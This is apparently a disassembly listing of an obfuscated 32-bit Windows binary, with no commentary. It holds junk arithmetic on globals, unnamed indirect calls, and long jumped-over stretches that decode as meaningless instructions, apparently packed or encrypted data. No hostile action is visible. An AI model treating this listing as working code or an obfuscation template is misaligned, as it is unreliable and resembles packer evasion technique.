  402c3b:	jl     0x402c5f
  402c41:	push   DWORD PTR [ebp-0x18]
  402c44:	push   0x2a6e
  402c49:	call   DWORD PTR ds:0x42e240
  402c4f:	sbb    DWORD PTR ds:0x428341,0x59bd
  402c59:	sub    edx,0x641d
  402c5f:	sbb    DWORD PTR ds:0x428349,0x428501
  402c69:	sbb    DWORD PTR ds:0x4284e5,0x27b0
  402c73:	mov    edx,DWORD PTR ds:0x4284ad
  402c79:	mov    edx,DWORD PTR [edx]
  402c7b:	adc    DWORD PTR ds:0x428405,edx
  402c81:	xor    DWORD PTR ds:0x428455,0x428421
  402c8b:	sbb    DWORD PTR ds:0x428471,0x33ea
  402c95:	shr    eax,0x2
  402c98:	cmp    DWORD PTR ds:0x428445,0x0
  402c9f:	mov    DWORD PTR ds:0x428561,0x384
  402ca9:	mov    DWORD PTR ds:0x428345,0x2b95
  402cb3:	mov    edx,DWORD PTR ds:0x428549
  402cb9:	mov    DWORD PTR ds:0x428501,edx
  402cbf:	jmp    0x402d0e
  402cc4:	mov    eax,0x220e
  402cc9:	mov    DWORD PTR ds:0x4284ed,0x7b53
  402cd3:	cmp    DWORD PTR ds:0x428445,0x0
  402cda:	jbe    0x402d06
  402ce0:	push   0x3c7e
  402ce5:	push   0x1ff0
  402cea:	call   DWORD PTR ds:0x42e0b0
  402cf0:	sub    edx,0x6132
  402cf6:	sbb    DWORD PTR ds:0x428501,0x612a
  402d00:	sbb    DWORD PTR ds:0x428565,ecx
  402d06:	dec    edx
  402d07:	inc    edx
  402d08:	and    edx,DWORD PTR ds:0x428565
  402d0e:	mov    eax,DWORD PTR [ebx]
  402d10:	mov    edx,DWORD PTR [ebx+0x4]
  402d13:	dec    DWORD PTR ds:0x428405
  402d19:	xor    ecx,edi
  402d1b:	shl    eax,0x1e
  402d1e:	xor    edx,0x1700
  402d24:	xor    eax,eax
  402d26:	sub    edx,0x11fc
  402d2c:	or     eax,ecx
  402d2e:	mov    ecx,DWORD PTR [ebx]
  402d30:	cmp    DWORD PTR ds:0x428501,0x0
  402d37:	mov    DWORD PTR ds:0x428469,0x400c
  402d41:	mov    edx,DWORD PTR ds:0x42842d
  402d47:	mov    edx,DWORD PTR ds:0x4284fd
  402d4d:	jmp    0x402d9d
  402d52:	mov    DWORD PTR ds:0x428451,0x114
  402d5c:	cmp    DWORD PTR ds:0x428501,0x0
  402d63:	je     0x402d85
  402d69:	push   DWORD PTR [ebp-0x24]
  402d6c:	call   DWORD PTR ds:0x42e0b4
  402d72:	dec    edx
  402d73:	xor    edx,DWORD PTR ds:0x428559
  402d79:	or     DWORD PTR ds:0x428439,ebx
  402d7f:	sub    DWORD PTR ds:0x4284fd,ecx
  402d85:	mov    edx,DWORD PTR ds:0x42854d
  402d8b:	xor    DWORD PTR ds:0x4284ed,edx
  402d91:	xor    edx,0x442c
  402d97:	not    DWORD PTR ds:0x42833d
  402d9d:	mov    edx,DWORD PTR [ebx+0x4]
  402da0:	add    DWORD PTR ds:0x428439,0x428419
  402daa:	shrd   ecx,edx,0x2
  402dae:	shr    edx,0x2
  402db1:	mov    DWORD PTR [ebp-0x1c],ecx
  402db4:	sbb    edx,DWORD PTR ds:0x428501
  402dba:	mov    ecx,DWORD PTR [ebx]
  402dbc:	mov    edx,DWORD PTR ds:0x428481
  402dc2:	xor    DWORD PTR ds:0x4284ed,edx
  402dc8:	mov    edx,DWORD PTR [ebx+0x4]
  402dcb:	xor    DWORD PTR [ebp-0x1c],edi
  402dce:	and    DWORD PTR ds:0x428471,0x4abe
  402dd8:	xor    edx,edx
  402dda:	sub    DWORD PTR ds:0x428411,0x1446
  402de4:	or     edx,DWORD PTR [ebp-0x1c]
  402de7:	shl    ecx,0x1e
  402dea:	lea    ecx,[edx+eax*1]
  402ded:	mov    edx,DWORD PTR ds:0x42852d
  402df3:	xor    eax,eax
  402df5:	xor    eax,DWORD PTR ds:0x4285b9
  402dfb:	sub    edx,eax
  402dfd:	add    edx,DWORD PTR [edx+eax*1]
  402e00:	mov    eax,DWORD PTR [ebx]
  402e02:	xor    DWORD PTR ds:0x428571,ecx
  402e08:	mov    edx,DWORD PTR [ebx+0x4]
  402e0b:	or     DWORD PTR ds:0x42840d,0x3bc
  402e15:	shrd   eax,edx,0x2
  402e19:	shr    edx,0x2
  402e1c:	cmp    DWORD PTR ds:0x42857d,0x0
  402e23:	mov    DWORD PTR ds:0x42846d,ebx
  402e29:	mov    DWORD PTR ds:0x428471,0x656f
  402e33:	movzx  edx,BYTE PTR ds:0x428419
  402e3a:	jmp    0x402e93
  402e3f:	mov    DWORD PTR ds:0x42843d,0x5c7
  402e49:	mov    DWORD PTR ds:0x42847d,0x3013
  402e53:	cmp    DWORD PTR ds:0x42857d,0x0
  402e5a:	jle    0x402e7f
  402e60:	push   DWORD PTR [ebp-0x24]
  402e63:	call   DWORD PTR ds:0x42e0b8
  402e69:	sub    DWORD PTR ds:0x428351,0x7db0
  402e73:	sub    DWORD PTR ds:0x428581,ecx
  402e79:	adc    DWORD PTR ds:0x42840d,edx
  402e7f:	and    edx,DWORD PTR ds:0x4284e9
  402e85:	mov    edx,DWORD PTR ds:0x42839d
  402e8b:	mov    edx,DWORD PTR [edx]
  402e8d:	xor    DWORD PTR ds:0x42836d,edx
  402e93:	mov    DWORD PTR [ebp-0x1c],eax
  402e96:	not    DWORD PTR ds:0x428451
  402e9c:	mov    eax,DWORD PTR [ebx]
  402e9e:	add    DWORD PTR ds:0x4284e9,0x4968
  402ea8:	jmp    0x403249
  402ead:	cmp    al,0xdc
  402eaf:	(bad)  
  402eb0:	inc    ebp
  402eb1:	ss dec ebx
  402eb3:	mov    esp,0x8c100abc
  402eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb9:	(bad)  
  402eba:	aas    
  402ebb:	mov    WORD PTR [ebp+edi*4-0x42414120],fs
  402ec2:	les    edi,FWORD PTR [esi-0xb0b0742]
  402ec8:	xchg   ecx,eax
  402ec9:	cmp    BYTE PTR [edi+eax*2],ch
  402ecc:	into   
  402ecd:	inc    esp
  402ece:	ja     0x402f04
  402ed0:	je     0x402ee0
  402ed2:	adc    edi,DWORD PTR [eax]
  402ed4:	in     eax,0xb7
  402ed6:	cdq    
  402ed7:	cld    
  402ed8:	fdivr  QWORD PTR [edi-0x67]
  402edb:	xor    DWORD PTR [edi+0x1],0x77
  402edf:	ret    
  402ee0:	mov    esp,0xbf4a0831
  402ee5:	mov    ch,0xde
  402ee7:	dec    esp
  402ee8:	cmp    DWORD PTR [eax+edi*4],edx
  402eeb:	cwde   
  402eec:	dec    ebp
  402eed:	in     al,dx
  402eee:	imul   esp,DWORD PTR [edx+edi*4+0x1a],0x23
  402ef3:	dec    esi
  402ef4:	aad    0xd4
  402ef6:	aaa    
  402ef7:	mov    bh,0xde
  402ef9:	cdq    
  402efa:	mov    bl,0xaf
  402efc:	hlt    
  402efd:	dec    eax
  402efe:	cli    
  402eff:	adc    eax,DWORD PTR ds:0x665d48cf
  402f05:	dec    esp
  402f06:	retf   
  402f07:	mov    ds:0x133242f5,ax
  402f0d:	push   esi
  402f0e:	fidiv  DWORD PTR [eax-0x17]
  402f11:	scas   eax,DWORD PTR es:[edi]
  402f12:	push   ecx
  402f13:	hlt    
  402f14:	inc    ebp
  402f15:	sub    eax,0xed3d18c9
  402f1a:	push   ds
  402f1b:	sar    BYTE PTR [ebx-0x6c36e9c4],0xab
  402f22:	test   al,0xa9
  402f24:	fcmovnb st,st(7)
  402f26:	popf   
  402f27:	retf   0xd02d
  402f2a:	xor    BYTE PTR [edx+0x4e],dh
  402f2d:	imul   edx,ebx,0x11
  402f30:	xlat   BYTE PTR ds:[ebx]
  402f31:	sub    eax,0x94ab8d98
  402f36:	jnp    0x402f01
  402f38:	stos   BYTE PTR es:[edi],al
  402f39:	(bad)  
  402f3a:	bound  edx,QWORD PTR [esi]
  402f3c:	inc    esi
  402f3d:	mov    ecx,0x4e52a3bb
  402f42:	ret    
  402f43:	add    al,0xb3
  402f45:	mov    ah,0xb3
  402f47:	jg     0x402f63
  402f49:	call   0xfdc2:0xa524fe44
  402f50:	xchg   ebx,eax
  402f51:	and    BYTE PTR [ecx],dl
  402f53:	(bad)  
  402f54:	mov    eax,0x17519f91
  402f59:	and    DWORD PTR [ebp-0x6c7f29ce],esi
  402f5f:	wbinvd 
  402f61:	shr    DWORD PTR [edx+ebx*4+0x1e],0x6b
  402f66:	rcr    DWORD PTR [edi+edi*2+0x3788ddd1],0xbc
  402f6e:	ror    edx,0xc1
  402f71:	pop    ebx
  402f72:	(bad)  
  402f73:	xchg   esp,eax
  402f74:	cli    
  402f75:	adc    eax,0xab2682e4
  402f7a:	(bad)  
  402f7b:	mov    esi,0xe90be08d
  402f80:	lahf   
  402f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f82:	or     al,0x6c
  402f84:	jae    0x402f22
  402f86:	push   esi
  402f87:	(bad)  
  402f88:	std    
  402f89:	jle    0x402fd8
  402f8b:	or     WORD PTR [edx+edi*8+0x36],dx
  402f90:	pop    ss
  402f91:	xor    al,0xcb
  402f93:	cwde   
  402f94:	retf   
  402f95:	fnstcw WORD PTR [ebp-0x1b]
  402f98:	scas   eax,DWORD PTR es:[edi]
  402f99:	xlat   BYTE PTR ds:[ebx]
  402f9a:	fimul  DWORD PTR [eax]
  402f9c:	sub    edx,ebx
  402f9e:	mov    dh,0xb9
  402fa0:	ror    dh,1
  402fa2:	mov    ah,ah
  402fa4:	push   cs
  402fa5:	arpl   WORD PTR [edi-0x20],ax
  402fa8:	test   BYTE PTR [esi-0x4567e0d6],ch
  402fae:	in     eax,dx
  402faf:	rcl    DWORD PTR [edx+0x6dec4327],1
  402fb5:	test   BYTE PTR [esp+ebp*8],bl
  402fb8:	(bad)  
  402fb9:	loop   0x402fd0
  402fbb:	or     al,0x75
  402fbd:	jnp    0x40303c
  402fbf:	xor    eax,0xd4e81879
  402fc4:	inc    esi
  402fc5:	and    bl,bh
  402fc7:	pinsrw mm1,WORD PTR [eax],0x0
  402fcb:	or     al,0x1d
  402fcd:	dec    esi
  402fce:	pop    ds
  402fcf:	sbb    esp,DWORD PTR [edx]
  402fd1:	test   BYTE PTR [ebx+0x14],bh
  402fd4:	mov    edx,0xa9adb814
  402fd9:	fs adc eax,0x65
  402fdd:	dec    edi
  402fde:	push   ecx
  402fdf:	xchg   ebx,eax
  402fe0:	call   DWORD PTR [ecx-0x1d]
  402fe3:	frstor [edx]
  402fe5:	pop    ebp
  402fe6:	stos   DWORD PTR es:[edi],eax
  402fe7:	pop    fs
  402fe9:	dec    edi
  402fea:	xchg   bh,bh
  402fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fed:	lock inc edx
  402fef:	in     eax,0x5b
  402ff1:	mov    edi,0xe111f3a0
  402ff6:	and    ch,BYTE PTR [ecx]
  402ff8:	xchg   edx,eax
  402ff9:	pop    edx
  402ffa:	jns    0x40306f
  402ffc:	shr    DWORD PTR [edi-0x16],1
  402fff:	fcom   DWORD PTR [edx+0x58b471da]
  403005:	aas    
  403006:	sub    DWORD PTR ds:0x839536ff,esp
  40300c:	inc    ebx
  40300d:	adc    edi,ecx
  40300f:	jae    0x40308c
  403011:	xor    DWORD PTR [esi+0x69],edx
  403014:	jge    0x402faf
  403016:	int    0x10
  403018:	int3   
  403019:	and    eax,0x1e99ad5
  40301e:	ret    0xc526
  403021:	pcmpgtd mm0,QWORD PTR [edi+0x2b]
  403025:	jne    0x402fda
  403027:	iret   
  403028:	shl    BYTE PTR [ebp+0x77],1
  40302b:	xor    eax,0x7312f3d7
  403030:	lahf   
  403031:	packssdw mm6,QWORD PTR [eax+edx*8-0x4]
  403036:	jmp    0x402fdc
  403038:	xchg   ebx,eax
  403039:	inc    ecx
  40303a:	ins    BYTE PTR es:[edi],dx
  40303b:	xor    DWORD PTR [edx+0x278264d4],0x73bd0bc8
  403045:	mov    ecx,0xa3410083
  40304a:	cdq    
  40304b:	adc    edx,DWORD PTR [eax+0x673e2e99]
  403051:	mov    BYTE PTR [ecx-0x3cd626a6],al
  403057:	aaa    
  403058:	push   ds
  403059:	cmp    BYTE PTR [edx-0x6ae32287],dl
  40305f:	lods   eax,DWORD PTR ds:[esi]
  403060:	xchg   ebx,eax
  403061:	push   ss
  403062:	add    ebp,DWORD PTR [ecx]
  403064:	shr    BYTE PTR [ebx+0x62402d8e],0x65
  40306b:	sbb    eax,0xe02907a2
  403070:	popf   
  403071:	test   BYTE PTR [esp+ebp*8+0x408ff62d],dh
  403078:	(bad)  [edx+0x149bf00f]
  40307e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40307f:	ficomp WORD PTR [eax]
  403081:	in     eax,0x27
  403083:	fcmovnbe st,st(0)
  403085:	inc    esp
  403086:	neg    esp
  403088:	inc    ebx
  403089:	xchg   BYTE PTR [esi],dh
  40308b:	enter  0x2fe3,0xda
  40308f:	fbstp  TBYTE PTR [ebp+esi*1+0x22]
  403093:	xchg   ebp,eax
  403094:	je     0x4030c0
  403096:	or     edi,ecx
  403098:	cmp    ch,BYTE PTR [eax-0x5a918eaa]
  40309e:	adc    esi,eax
  4030a0:	lods   al,BYTE PTR ds:[esi]
  4030a1:	jmp    0x4030a3
  4030a3:	xchg   cl,al
  4030a5:	xchg   BYTE PTR [edi+0x286face2],dl
  4030ab:	cdq    
  4030ac:	and    al,0x9e
  4030ae:	xor    eax,DWORD PTR [ebp-0x752698cd]
  4030b4:	lds    edx,FWORD PTR [eax-0x203a8e48]
  4030ba:	(bad)  
  4030bb:	leave  
  4030bc:	mov    DWORD PTR [esi],ecx
  4030be:	lea    ecx,[esi-0x61]
  4030c1:	push   esp
  4030c2:	lahf   
  4030c3:	or     esp,DWORD PTR [edi]
  4030c5:	dec    esp
  4030c6:	lods   eax,DWORD PTR ds:[esi]
  4030c7:	int    0x53
  4030c9:	call   0x603f:0xdb93f9c1
  4030d0:	jp     0x403069
  4030d2:	inc    edi
  4030d3:	retf   
  4030d4:	push   ecx
  4030d5:	and    edi,DWORD PTR [ecx-0x38bef055]
  4030db:	inc    esp
  4030dc:	daa    
  4030dd:	mov    al,ds:0x52dd84af
  4030e2:	mov    esp,0x3cd6dd2d
  4030e7:	add    eax,0x11fb0b6e
  4030ec:	jbe    0x403101
  4030ee:	call   0x3da4:0x76a91f58
  4030f5:	and    DWORD PTR [ecx+0xb02bab5],0xe3ff7100
  4030ff:	xlat   BYTE PTR ds:[ebx]
  403100:	mov    al,0xeb
  403102:	mov    DWORD PTR [ecx+ebx*2],edi
  403105:	bound  edx,QWORD PTR [edx+0x67af4203]
  40310b:	xchg   ecx,eax
  40310c:	dec    BYTE PTR [edi+0xc0d735a]
  403112:	aad    0xf7
  403114:	inc    ecx
  403115:	xchg   edx,eax
  403116:	jecxz  0x40310a
  403118:	mov    ch,0xc9
  40311a:	push   es
  40311b:	into   
  40311c:	xor    cl,BYTE PTR [edx]
  40311e:	inc    esp
  40311f:	inc    edi
  403120:	jo     0x403111
  403122:	clc    
  403123:	cli    
  403124:	cmp    DWORD PTR [ebx+edx*4+0x1],esi
  403128:	into   
  403129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40312a:	xlat   BYTE PTR ds:[ebx]
  40312b:	mov    DWORD PTR [edi-0xc],ebx
  40312e:	sbb    edi,DWORD PTR [esi]
  403130:	mov    DWORD PTR [esi+0x14],esp
  403133:	dec    edi
  403134:	inc    edi
  403135:	xchg   BYTE PTR [ecx],al
  403137:	sbb    esp,ebx
  403139:	mov    bl,0x90
  40313b:	pusha  
  40313c:	fs pop edi
  40313e:	dec    ecx
  40313f:	mov    dl,BYTE PTR [ebx-0x59]
  403142:	xchg   ebp,eax
  403143:	mov    bl,0x1e
  403145:	xor    cl,BYTE PTR [edi+0x20d470ca]
  40314b:	mov    ss,WORD PTR [ecx-0x2b]
  40314e:	fdiv   QWORD PTR [ebp+0x50]
  403151:	cmp    DWORD PTR gs:[ecx+0x5a],esp
  403155:	sbb    esp,edx
  403157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403158:	adc    ecx,ecx
  40315a:	push   ebx
  40315b:	and    al,0x98
  40315d:	xor    ch,BYTE PTR [edi*8-0x27b6d4a6]
  403164:	leave  
  403165:	push   eax
  403166:	imul   ecx,DWORD PTR [edx-0xbeaf955],0x6a
  40316d:	push   esp
  40316e:	into   
  40316f:	push   ss
  403170:	jp     0x403120
  403172:	in     eax,dx
  403173:	in     al,0x78
  403175:	addr16 ret 
  403177:	in     al,0xdc
  403179:	fs dec esp
  40317b:	pusha  
  40317c:	add    eax,0xf862947e
  403181:	inc    esi
  403182:	out    dx,eax
  403183:	mov    dl,0x86
  403185:	cwde   
  403186:	imul   esp,edi,0x3b4441e4
  40318c:	xor    al,0x7a
  40318e:	std    
  40318f:	es add eax,0x2d8d1c87
  403195:	cmc    
  403196:	and    DWORD PTR [esi],ebx
  403198:	xor    BYTE PTR [ecx],bh
  40319a:	adc    eax,0x75ccaff
  40319f:	sub    BYTE PTR [eax+0x3c],dh
  4031a2:	(bad)  
  4031a3:	and    esp,DWORD PTR [ebp-0x1e057082]
  4031a9:	(bad)  
  4031aa:	imul   BYTE PTR [ebp-0x55]
  4031ad:	lods   eax,DWORD PTR ds:[esi]
  4031ae:	aad    0x62
  4031b0:	or     DWORD PTR [edi-0x4ba02160],0xffffffd5
  4031b7:	sbb    edx,esi
  4031b9:	scas   eax,DWORD PTR es:[edi]
  4031ba:	stc    
  4031bb:	repz sub al,0x40
  4031be:	popf   
  4031bf:	fcmovnu st,st(1)
  4031c1:	jo     0x40320b
  4031c3:	sbb    DWORD PTR [edi+0x27d3d086],eax
  4031c9:	lahf   
  4031ca:	icebp  
  4031cb:	fldl2t 
  4031cd:	movntps XMMWORD PTR [ebp-0x3ff00651],xmm1
  4031d4:	mov    gs,esi
  4031d6:	xchg   ebx,eax
  4031d8:	pop    ss
  4031d9:	mov    ebp,DWORD PTR [edi+eiz*8-0x1]
  4031dd:	dec    esi
  4031de:	xchg   ebp,eax
  4031df:	mov    esp,0x701e7f63
  4031e4:	arpl   WORD PTR [ecx],bp
  4031e6:	inc    ebx
  4031e7:	(bad)  
  4031e8:	in     eax,0xad
  4031ea:	cwde   
  4031eb:	cli    
  4031ec:	sbb    al,0xa7
  4031ee:	inc    edx
  4031ef:	push   0xffffffcb
  4031f1:	cdq    
  4031f2:	not    BYTE PTR [esi-0x32]
  4031f5:	mov    dl,0xc0
  4031f7:	jne    0x40322f
  4031f9:	shr    eax,cl
  4031fb:	cmp    esp,DWORD PTR [ebp-0x71]
  4031fe:	out    dx,eax
  4031ff:	dec    ebp
  403200:	dec    ebp
  403201:	gs (bad) 
  403204:	(bad)  
  403205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403206:	shl    bh,0x19
  403209:	jg     0x4031c8
  40320b:	call   0x273:0xa7f2d578
  403212:	jmp    0x75bb789d
  403217:	mov    ds:0xd31a4113,eax
  40321c:	call   0x1719fb39
  403221:	mov    eax,ds:0x9f59db0
  403226:	sbb    eax,0xe5bdd564
  40322b:	int    0x73
  40322d:	adc    bh,0x17
  403230:	mov    al,0x71
  403232:	and    dh,0x55
  403235:	push   ebx
  403236:	push   0xffffffcd
  403238:	leave  
  403239:	mov    bh,BYTE PTR [edx]
  40323b:	into   
  40323c:	retf   0x452d
  40323f:	lds    ebx,FWORD PTR [ebp-0x76eaef7a]
  403245:	cmp    al,0x68
  403247:	test   al,0xa4
  403249:	mov    edx,DWORD PTR [ebx+0x4]
  40324c:	xor    DWORD PTR [ebp-0x1c],edi
  40324f:	sub    DWORD PTR ds:0x4284d9,ebx
  403255:	mov    edx,eax
  403257:	sub    DWORD PTR ds:0x428579,0x42835d
  403261:	xor    eax,eax
  403263:	or     eax,DWORD PTR [ebp-0x1c]
  403266:	shl    edx,0x1e
  403269:	mov    edx,DWORD PTR ds:0x428459
  40326f:	xor    DWORD PTR ds:0x42840d,edx
  403275:	imul   eax,ecx
  403278:	sub    DWORD PTR ds:0x4284f9,0x4172
  403282:	mov    ecx,DWORD PTR [ebx]
  403284:	add    edx,0x41d1
  40328a:	mov    edx,DWORD PTR [ebx+0x4]
  40328d:	shrd   ecx,edx,0x2
  403291:	mov    DWORD PTR [ebp-0x1c],ecx
  403294:	mov    ecx,DWORD PTR [ebx]
  403296:	or     DWORD PTR ds:0x4284c9,0x42b9
  4032a0:	xor    DWORD PTR [ebp-0x1c],edi
  4032a3:	mov    DWORD PTR ds:0x428555,0x397a
  4032ad:	shr    edx,0x2
  4032b0:	cmp    DWORD PTR ds:0x42855d,0x0
  4032b7:	mov    DWORD PTR ds:0x4284f1,0x7cee
  4032c1:	mov    edx,DWORD PTR ds:0x428405
  4032c7:	jmp    0x403370
  4032cc:	mov    DWORD PTR ds:0x42835d,0x3170
  4032d6:	cmp    DWORD PTR ds:0x42855d,0x0
  4032dd:	jge    0x403302
  4032e3:	push   DWORD PTR [ebp-0x28]
  4032e6:	call   DWORD PTR ds:0x42e244
  4032ec:	add    edx,DWORD PTR ds:0x42841d
  4032f2:	sub    edx,0x765a
  4032f8:	xor    DWORD PTR ds:0x4284d5,0x290
  403302:	sbb    DWORD PTR ds:0x428411,edi
  403308:	inc    edx
  403309:	not    edx
  40330b:	cmp    DWORD PTR ds:0x4284f1,0x0
  403312:	mov    edx,DWORD PTR ds:0x428431
  403318:	mov    DWORD PTR ds:0x4284cd,0x501f
  403322:	mov    edx,DWORD PTR ds:0x4284d1
  403328:	jmp    0x403370
  40332d:	mov    DWORD PTR ds:0x428375,0x1634
  403337:	mov    DWORD PTR ds:0x4284e9,0xaef
  403341:	cmp    DWORD PTR ds:0x4284f1,0x0
  403348:	jb     0x403364
  40334e:	call   DWORD PTR ds:0x42e0bc
  403354:	adc    DWORD PTR ds:0x428431,0x42847d
  40335e:	adc    edx,0x2d88
  403364:	and    edx,0x4ab7
  40336a:	sub    edx,DWORD PTR ds:0x428411
  403370:	mov    edx,DWORD PTR [ebx+0x4]
  403373:	or     edx,DWORD PTR ds:0x4284e9
  403379:	mov    edx,ecx
  40337b:	add    DWORD PTR ds:0x428365,0x4284d9
  403385:	xor    ecx,ecx
  403387:	adc    DWORD PTR ds:0x428335,0x428455
  403391:	or     ecx,DWORD PTR [ebp-0x1c]
  403394:	sub    DWORD PTR ds:0x42844d,0x6b10
  40339e:	shl    edx,0x1e
  4033a1:	add    DWORD PTR ds:0x42833d,ebx
  4033a7:	sub    ecx,eax
  4033a9:	mov    DWORD PTR ds:0x428409,0x9e0
  4033b3:	mov    eax,DWORD PTR [ebp-0xc]
  4033b6:	cmp    DWORD PTR [eax],ecx
  4033b8:	mov    DWORD PTR ds:0x428569,0x2658
  4033c2:	mov    eax,DWORD PTR [ebp-0xc]
  4033c5:	mov    ecx,DWORD PTR [ebp+0x18]
  4033c8:	mov    edx,DWORD PTR ds:0x428361
  4033ce:	mov    edx,DWORD PTR [ebp+0x1c]
  4033d1:	jg     0x4038e5
  4033d7:	and    DWORD PTR ds:0x428571,0xf14
  4033e1:	shrd   ecx,edx,0x2
  4033e5:	xor    DWORD PTR ds:0x428439,0x428431
  4033ef:	mov    DWORD PTR [ebp-0x1c],ecx
  4033f2:	xor    DWORD PTR ds:0x428365,edi
  4033f8:	mov    ecx,DWORD PTR [ebp+0x18]
  4033fb:	xor    DWORD PTR [ebp-0x1c],edi
  4033fe:	shl    ecx,0x1e
  403401:	mov    DWORD PTR ds:0x428415,0x71ad
  40340b:	xor    ecx,ecx
  40340d:	or     ecx,DWORD PTR [ebp-0x1c]
  403410:	shr    edx,0x2
  403413:	sub    DWORD PTR ds:0x4284fd,0x3b82
  40341d:	mov    edx,DWORD PTR [ebp+0x1c]
  403420:	cmp    DWORD PTR ds:0x4284d1,0x0
  403427:	mov    DWORD PTR ds:0x428561,0xe2a
  403431:	mov    DWORD PTR ds:0x428349,ecx
  403437:	mov    edx,0x4d53
  40343c:	jmp    0x4034b7
  403441:	mov    DWORD PTR ds:0x428575,0xfd5
  40344b:	mov    DWORD PTR ds:0x428449,ecx
  403451:	cmp    DWORD PTR ds:0x4284d1,0x0
  403458:	jae    0x4034a5
  40345e:	push   DWORD PTR [ebp-0x1c]
  403461:	push   0x633e
  403466:	push   0x428267
  40346b:	push   DWORD PTR [ebp-0x1c]
  40346e:	push   DWORD PTR [ebp-0xc]
  403471:	push   DWORD PTR [ebp-0x20]
  403474:	push   DWORD PTR [ebp-0x24]
  403477:	push   0x6c89
  40347c:	call   DWORD PTR ds:0x42dff4
  403482:	movzx  edx,WORD PTR ds:0x42842d
  403489:	sub    edx,DWORD PTR ds:0x4284e5
  40348f:	mov    DWORD PTR ds:0x42842d,edx
  403495:	mov    DWORD PTR ds:0x428361,0x6c8
  40349f:	sbb    edx,DWORD PTR ds:0x42836d
  4034a5:	mov    edx,DWORD PTR ds:0x42857d
  4034ab:	and    DWORD PTR ds:0x428435,edx
  4034b1:	inc    DWORD PTR ds:0x42832d
  4034b7:	mov    DWORD PTR [ebp-0x2c],ecx
  4034ba:	xor    DWORD PTR ds:0x428345,0x3285
  4034c4:	mov    ecx,DWORD PTR [ebx]
  4034c6:	mov    edx,DWORD PTR [ebx+0x4]
  4034c9:	and    DWORD PTR ds:0x428549,0x4bb1
  4034d3:	shrd   ecx,edx,0x2
  4034d7:	mov    DWORD PTR ds:0x428429,0x325c
  4034e1:	shr    edx,0x2
  4034e4:	add    DWORD PTR ds:0x4284e1,0x68a9
  4034ee:	mov    DWORD PTR [ebp-0x1c],ecx
  4034f1:	sub    DWORD PTR ds:0x428481,ebx
  4034f7:	mov    ecx,DWORD PTR [ebx]
  4034f9:	sub    DWORD PTR ds:0x428469,0x4284ed
  403503:	mov    edx,DWORD PTR [ebx+0x4]
  403506:	xor    DWORD PTR [ebp-0x1c],edi
  403509:	sub    DWORD PTR ds:0x428349,0x428361
  403513:	xor    edx,edx
  403515:	or     edx,DWORD PTR [ebp-0x1c]
  403518:	add    DWORD PTR ds:0x428341,0x71c0
  403522:	shl    ecx,0x1e
  403525:	adc    DWORD PTR ds:0x4284f1,0x428471
  40352f:	imul   edx,DWORD PTR [ebp-0x2c]
  403533:	and    DWORD PTR ds:0x42844d,0x15cd
  40353d:	sub    DWORD PTR [eax],edx
  40353f:	jmp    0x4041b5
  403544:	jmp    0x4038e5
  403549:	pop    ss
  40354a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354b:	out    0xaf,eax
  40354d:	js     0x4034ff
  40354f:	cwde   
  403550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403551:	retf   
  403552:	mov    ch,0x34
  403554:	fucomp st(5)
  403556:	fist   WORD PTR [eax-0x41174170]
  40355c:	mov    esi,0xbebec4bd
  403561:	pop    eax
  403562:	je     0x403562
  403564:	ret    0xb1f8
  403567:	(bad)  
  403568:	fwait
  403569:	pusha  
  40356a:	mov    ah,0x58
  40356c:	pop    esp
  40356d:	lds    esp,FWORD PTR [ebx]
  40356f:	(bad)  
  403570:	xlat   BYTE PTR ds:[ebx]
  403571:	psubd  mm1,mm5
  403574:	pusha  
  403575:	adc    ebp,DWORD PTR [ebx-0x3ff5157f]
  40357b:	add    eax,0xde2354cf
  403580:	icebp  
  403581:	xchg   esi,eax
  403582:	jmp    0xdded:0x29b7274d
  403589:	mov    esi,0x336ab49e
  40358e:	adc    ebp,edi
  403590:	imul   esi,DWORD PTR [edx+0x50],0x31e2789a
  403597:	jge    0x403532
  403599:	xor    dl,BYTE PTR ds:0x8f1029fd
  40359f:	daa    
  4035a0:	rcr    DWORD PTR [edi],cl
  4035a2:	push   0x18
  4035a4:	int3   
  4035a5:	leave  
  4035a6:	sub    DWORD PTR [edi+0x7119900d],ebx
  4035ac:	pop    edi
  4035ad:	adc    eax,0x8ea6bf68
  4035b2:	dec    eax
  4035b3:	mov    dl,0x76
  4035b5:	sub    DWORD PTR [edx+0x2f4bb725],ecx
  4035bb:	inc    ebx
  4035bc:	sti    
  4035bd:	fsub   st(6),st
  4035bf:	xchg   edx,eax
  4035c0:	add    eax,edi
  4035c2:	mov    dh,0x8d
  4035c4:	(bad)  
  4035c5:	int    0xf0
  4035c7:	pop    eax
  4035c8:	loope  0x40355e
  4035ca:	dec    BYTE PTR [esp+eiz*8]
  4035cd:	lahf   
  4035ce:	test   al,0x4b
  4035d0:	push   esi
  4035d1:	jle    0x403564
  4035d3:	sahf   
  4035d4:	in     eax,dx
  4035d5:	fucom  st(6)
  4035d7:	(bad)  
  4035d8:	iret   
  4035d9:	gs pop ss
  4035db:	cmp    dl,BYTE PTR [ebp-0x5db33faf]
  4035e1:	inc    ebp
  4035e2:	and    dl,BYTE PTR [ebx+0x3dcfd30e]
  4035e8:	sti    
  4035e9:	imul   ecx,DWORD PTR [esp+ebp*8+0x458f58f3],0x37
  4035f1:	lock retf 0x2b84
  4035f5:	(bad)  
  4035f6:	fist   DWORD PTR [edx+0x1d1ebdc7]
  4035fc:	and    eax,eax
  4035fe:	add    dl,bl
  403600:	dec    ebx
  403601:	repz (bad) 
  403603:	sub    DWORD PTR [ecx+0x77],ebx
  403606:	mov    DWORD PTR [eax],esp
  403608:	jl     0x403628
  40360a:	add    bl,dl
  40360c:	fmul   DWORD PTR [eax+0x7bd6a85e]
  403612:	cmp    DWORD PTR [ebx+0x47e5ade8],ecx
  403618:	or     esp,esi
  40361a:	fld    DWORD PTR [eax+0xe]
  40361d:	xor    al,0xda
  40361f:	ins    BYTE PTR es:[edi],dx
  403620:	inc    ebx
  403621:	mov    ds:0xb8f39071,eax
  403626:	aad    0xb9
  403628:	add    ch,dl
  40362a:	cmc    
